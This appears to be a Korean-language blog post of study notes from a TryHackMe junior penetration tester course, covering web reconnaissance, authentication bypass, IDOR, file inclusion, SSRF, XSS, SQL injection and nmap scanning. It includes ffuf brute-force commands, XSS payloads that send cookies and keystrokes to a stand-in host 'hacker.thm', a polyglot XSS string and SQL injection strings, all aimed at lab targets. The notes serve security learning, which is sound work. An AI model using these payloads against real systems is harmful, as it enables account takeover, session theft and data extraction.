---
layout: post
title: Jr Penetration Tester
date: 2025-06-25 01:02 +0900
description:
category: security
tags: [pentest, web, red-team]
---

본 문서에서는 Jr penetration tester 과정에서 배운 것들을 요약하는 문서임.
많은 내용들과 기법을 다루기 때문에 문서의 내용은 불친절하고 축약적임.

## Content Discovery

* robots.txt/sitemap.xml
  * robots.txt 는 어떤 검색 엔진이 이 페이지를 crawling 하거나 보여줄 수 있는지를 명시하는 파일.
  * sitemap.xml 은 반대로 검색엔진에 등록되기를 바라는 페이지를 나열
  * **URL/robots.txt or URL/sitemap.xml 에 들어가서 목록들을 통해 어떤 url page 들이 존재하는지 확인하여 취약한 페이지를 찾아볼 수 있음.**
* favicon
  * 웹사이트를 프레임워크로 구축할 때, 설치 과정에서 제공되는 기본 favicon(즐겨찾기 아이콘)이 그대로 남아 있는 경우가 있다
  * default favicon 의 md5hash 로 어떤 프레임워크로 빌드했는지 추측할 수 있음.
    * `curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum`
  * 아래 사이트가 hash db 를 제공하고 있음.
    * <https://wiki.owasp.org/index.php/OWASP_favicon_database>.
  * **어떤 프레임워크로 구축했는지 안다면 그 프레임워크가 기본적으로 제공하는 관리페이지 같은 것들을 시도해볼 수 있음.**
* HTTP Header
  * http request 에 대한 응답으로 오는 패킷의 헤더에 서버 정보가 포함되어있음. 이로서 프레임워크 정보를 추가
  * `curl http://10.10.143.54 -v`
* OSINT
  * Google Hacking / Dorking
  * Wappalyzer
  * Wayback Machine
  * Github
  * S3 Buckets
* Automated Discovery
  * ffuf
  * dirb
  * gobuster

## Subdomain Enumeration

가능한 subdomain 을 찾는 것은 잠재적 취약점을 찾을 범위를 확장하기 위함.

* DNS Bruteforce
  * dnsrecon

* OSINT
  * SSL/TLS Ceritifcates
    * CA 가 인증서 생성할 때 CT 라는 로그를 남기게 되고 여기에 subdomain 정보들이 노출됨.
    * CT 에 대한 정보들을 제공하는 사이트로 <https://crt.sh> 가 있음.
  * Search engine
    * Gogole Hacking/Dorking
  * Sublist3r
* Virtual Host
  * 외부에 노출되지 않고 내부용으로만 사용되는 Host(subdomain) 을 Virtual Host 라고 하는듯.
  * ffuf 로 subdomain 에 대한 bruteforce 로 http request 를 날려서 찾아볼 수 있음.
    * `ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP`

## Authentication Bypass

* Username Enumeration
  * 유효한 username 의 목록을 추리는 것부터 시작한다.
  * user registration 을 할 때 valid username 에 대해 특정 메시지를 내는 경우에 아래처럼 리스트를 필터할 수 있음.
    * `user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"`
* Bruteforce
  * valid username 에 대해 알려진 password 로 bruteforce login 을 시도
    * `ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200`
* Logic Flaw
  * php 페이지 상의 로직 결함. 아래는 post 로 email 정보를 임의조작할 수 있는 결함을 이용
  * `user@tryhackme:~$ curl 'http://10.10.77.137/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'`
* **Cookie Tampering**
  * 이와 같은 형태로 탈취한 쿠키를 세팅할 수 있음. `Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/`
  * cookie 는 plaintext, hash, encoding 의 방식으로 생성될 수 있음. 따라서 탈취 뿐만 아니라 권한에 대한 내용이 있다면 이를 조작할 수 있음.
  * hash cracker
    * <https://crackstation.net/>

## Insecure Direct Object Reference (IDOR)

Access Control Vulnerability 의 일종
인증없이 혹은 권한을 넘어선 요청에 대해 리소스를 제공해주는 취약점

* Finding IDORs
  * Encoded IDs
  * Hashed IDs
  * Unpredictable IDs
    * 계정 두개의 각 id 를 서로 바꿔서 쿼리해보기
* IDORs 취약점 위치
  * 일반적으로 endpoint(url).
  * endpoint 가 주소창에 없는경우도 존재.
    * ajax 혹은 javascript 파일 내부에서 참조하는 형태
    * parameter mining 으로 어떤 query 가 가능한지 찾을 수 있음.

## File Inclusion

File Inclusion은 사용자 제어 입력을 통한 경로 조작으로 서버가 의도치 않은 파일을 읽거나 실행하게 만드는 취약점. 이를 통해 유저가 파일들(데이터/인증서 등)을 탈취하거나 file write 를 통해 RCE를 가능하게 만드는 취약점.

* URL
  * protocol://domain_name/filename?parameter=value
  * ? 이후를 query string
* Path Traversal( Directory Traversal)
  * 공격자가 애플리케이션이 실행 중인 서버의 로컬 파일 등 운영체제 자원에 접근할 수 있도록 한다.
  * 쉽게 말해 /app 이외에 /etc/passwd 같은 자원을 읽을 수 있다면 Path Traversal 에 취약
  * file_get_contents, readfile, fopen 등 단순 파일 읽기 함수를 이용하는 web app
* LFI(Local File Inclusion)
  * 서버 내부의 파일을 현재 실행 중인 코드에 포함시켜 실행 또는 출력
  * include, require, include_once, require_once 등의 함수를 이용하는 web app
  * include 이기 때문에 내용도 읽고 exectuion 도 가능함
  * Bypassing Techniques
    * null bytes ( %00 )
      * php 5.3.4 이전에서만 가능
    * php filter 를 속이기
      * ../ 를 empty string 으로 만들고 있다면 ....// 로 입력하는 등의 속이기
* RFI ( Remote File Inclusion )

## Server-Side Request Forgery(SSRF)

공격자가 웹 서버로 하여금 자신이 지정한 위치로 HTTP 요청을 보내게 하는 기법이다. 클라이언트가 직접 접근할 수 없는 리소스(예: 내부망, 인증된 외부 API 등)에 대해, 서버가 그 리소스에 접근할 수 있는 권한을 가지고 있다는 점을 악용하여, 서버를 중계자처럼 이용해 우회 접근하는 것.

* 분류
  * regular SSRF
    * 서버가 공격자가 지정한 외부 또는 내부 주소로 요청을 보내고, 그 응답이 클라이언트(공격자)에게 전달됨
  * Blind SSRF
    * 요청은 전송되지만, 그 결과가 클라이언트에 표시되지 않음.
    * output 을 볼 수 없으므로 brup suite 을 사용하거나 별도의 툴을 직접 만들어서 모니터링.
* 취약점 찾기
  * url, page soruce 분석,

## Cross Site Scripting ( XSS )

injectino 공격의 일종. 악의적인 javascript code 를 삽입해서 다른 사용자의 브라우저에서 실행되도록 유도하는 방식.

* Payload
* Proof of Concept
  * `<script>alert('XSS');</script>`
* Session Stealing
  * `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
* Key logger
  * `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
* Business logic
  * `<script>user.changeEmail('attacker@hacker.thm');</script>`

-----

* Reflected XSS
  * user 가 http request 로 보낸 데이터가 웹페이지 소스에 검증없이 그대로 반영되는 경우
  * http request 로 XSS payload 를 보내면 됨.
  * 공격 시나리오
    * attacker 가 victim 에게 XSS payload 를 포함한 http request 링크를 보내고, victim 이 링크를 여는 경우
* Stored XSS
  * web app(e.g. database) 에 XSS payload 가 저장된 후 해당 웹에 방문할 때 실행됨
  * 공격 시나리오
    * 블로그 댓글에 심어둔 XSS payload
  * DOM XSS
  * Blind XSS
    * Stored XSS 처럼 다른 유저가 보는 웹사이트에 payload 가 저장된다는 점에서는 같지만, attacker 가 먼저 테스트해볼 수 없다는 점에서 다름
  * Polyglot
    * ```jaVasCript:/*-/*`/*\/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e```

## Race Condition

Web application 은 보통
[Multi-Layer Architecture](https://medium.com/software-architecture-patterns-and-styles/software-architecture-patterns-and-styles-part-1-multi-tier-architecture-bc5064ea6329) 로 설계됨. 해당 개념은 아래 링크 참조

* 결국 Atomic Operation 으로 상태관리에 미흡한 경우에 발생한 것이고, 이를 poc 하기 위해 burp suite 의 repeater 를 이용함.
* burp suite 에서 group 에 request 를 하나 넣고 duplicate 20 times 한 뒤 send in parallel 을 하면 됨.

## Command Injection

Remote Code Execution(RCE)라고도 불림

## SQL Injection

`https://website.thm/blog?id=1` =>
`SELECT * from blog where id=1 and private=0 LIMIT 1;`
로 실행하는 어플리케이션이 있다고 가정.
`https://website.thm/blog?id=2;--` =>
`SELECT * from blog where id=2;-- and private=0 LIMIT 1;`
가 되어 private 속성과 관계없이 id 2인 문서를 가져오게 됨.

* In-Band SQL Injection
  * 취약점을 악용하는 데 사용된 통신 경로와 결과를 수신하는 경로가 동일하다는 의미
  * Types
    * Error-Based SQL Injection
    * Union-Based SQL Injection
      * SQL의 UNION 연산자를 SELECT 문과 함께 사용하여, 추가적인 결과를 웹 페이지에 출력되도록 한다. SQL 인젝션 취약점을 통해 대량의 데이터를 추출하는 가장 일반적인 방법이다.
  * `0 UNION SELECT 1,2,database()`

* Blind SQLi
  * test sql 이 성공했는지 확인할 수 없는 경우. 에러 메시지가 비활성화 된 경우.
  * Types
    * Authentication Bypass
      * DB 열거가 목적이 아닌 단순히 로그인 폼을 우회하기 위한 sqli
* Boolean Based SQLi
  * injection 시도의 결과로 true/fasle, yes/no , 1/0 의 결과만 얻게되는 유형
* Time Based SQLi
  * boolean 과 같은데 success 유무를 sleep 이 먹히는지 안먹히는지로 판별. 먹힌다 => success
  * `admin123' UNION SELECT SLEEP(5);--`

* Out-of-band SQLi
  * sql 결과에 따라 네트워크 호출이 있는 경우에 공격 채널과는 별개의 네트워크로 데이터를 수집하는 sqli
  * 예를 들면, sql 에 따라 `query-result.web.com?another_data=3`  이런 형태로 url 에 Request 를 준다고 가정
  * 공격자는 web.com 에 대한 dns 로의 요청을 모니터링 하고 있다면 data 를 사실상 빼앗기는 셈

## Passive Reconnaissance

* whois
* dns lookup kind
  * command
    * nslookup
    * dig, the acronym for “Domain Information Groper,”
  * services
    * DNSDumpster
    * shodan.io

## Activate Reconaissance

* web browser ( dev tool , add-ons like FoxyProxy)
* ping
* traceroute
* telnet
* netcat

## Nmap Live Host Discovery

* Enumerating Targets
  * nmap -sL 192.168.1.0/24
* ARP scanning
  * nmap -PR -sn
  * -PR ; ARP scan , -sn ; skip the port scanning
* ICMP scanning
  * nmap -PE -sn MACHINE_IP/24
  * -PE ; ICMP echo(ping), -PP ; ICMP timestamp; -PM ; ICMP mask
* TCP/UDP scanning
  * -PS -sn MACHINE_IP/24
  * -PS; TCP SYN, -PA ; TCP ACK,-PU ; UDP
* reverse dns
  * nmap 은 기본적으로 찾아낸 ip 의 dns 를 찾아줌. ip -> dns 를 발견해주는걸 reverse dns 라 함
